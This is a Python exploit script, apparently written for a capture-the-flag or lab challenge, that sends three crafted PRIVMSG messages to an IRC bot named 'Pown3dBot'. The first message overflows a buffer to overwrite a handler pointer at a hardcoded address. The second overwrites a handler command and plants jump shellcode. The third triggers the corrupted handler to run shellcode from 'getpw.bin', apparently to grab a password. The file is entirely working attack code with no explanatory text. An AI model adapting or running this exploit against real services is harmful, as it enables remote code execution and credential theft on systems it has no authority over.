import sys
import struct


def get_privmsg(text):
    return b'PRIVMSG Pown3dBot :' + text + b'\n'


out = b''


# exploit 0: overwrite handler pointer
s = b''
# buff
s += b'!'
s += b'X' * 35
# n_handlers
s += b'\x01\x01\x01\x01'
# padding
s += b'Y' * 24
# 0th handler command
s += b'A' * 36
# 0th handler ptr (into buff, after '!')
s += struct.pack('<I', 0x0804b120 + 1)

out += get_privmsg(s)


# exploit 1: overwrite handler command, and place jmpcode
s = b''
# buff
s += b'!'
with open('jmpcode.bin', 'rb') as f:
    shellcode = f.read()
assert len(shellcode) < 64
s += shellcode
# padding
s = s.ljust(64, b'\x01')
# ensure handlers didn't end up negative
n_handlers = struct.unpack('<i', s[36:40])[0]
assert n_handlers > 0
# 0th handler command
s += b'PRIVMSG'

out += get_privmsg(s)


# exploit 2: trigger evil handler which runs the shellcode below
with open('getpw.bin', 'rb') as f:
    shellcode = f.read()
out += get_privmsg(b'!' + shellcode)

sys.stdout.buffer.write(out)